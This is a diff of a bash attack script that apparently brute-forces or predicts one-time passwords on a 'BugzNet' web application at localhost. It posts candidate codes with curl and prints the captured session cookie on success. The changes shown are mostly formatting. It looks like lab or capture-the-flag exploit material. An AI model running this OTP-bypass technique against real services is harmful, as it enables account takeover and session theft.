@@ -2,8 +2,8 @@
 
 if [[ $# -eq 0 ]]
 then
-        echo "USAGE: $0 <username> <password>"
-        exit 1
+    echo "USAGE: $0 <username> <password>"
+    exit 1
 fi
 
 rhost="http://localhost"
@@ -22,6 +22,7 @@ namespace ticks
                 }
         }
 }"
+
 echo $ticks > ticks.cs
 mcs -out:ticks.exe ticks.cs
 csharp="using System;
@@ -60,11 +61,11 @@ xsrf_token=$(curl -s -b $cookieJar "$rhost/MyAccount/Verify?handler=Generate" --
 end=`mono ticks.exe`
 
 verify_otp() {
-        echo "Trying $1"
+        printf "\rTrying $1"
         curl -s -i -b $cookieJar -c $cookieJar "$rhost/MyAccount/Verify?handler=Verify" \
                 --data-urlencode "Data.OTP=$1" \
                 --data-urlencode "xsrf_token=$xsrf_token" | grep -q 'Location: /Bugs' \
-                        && echo "CookieJar: $cookieJar" \
+                        && printf "\nCookieJar: $cookieJar\n" \
                         && cat $cookieJar | grep BugzNet-Session \
                         && exit 0
         sleep 1
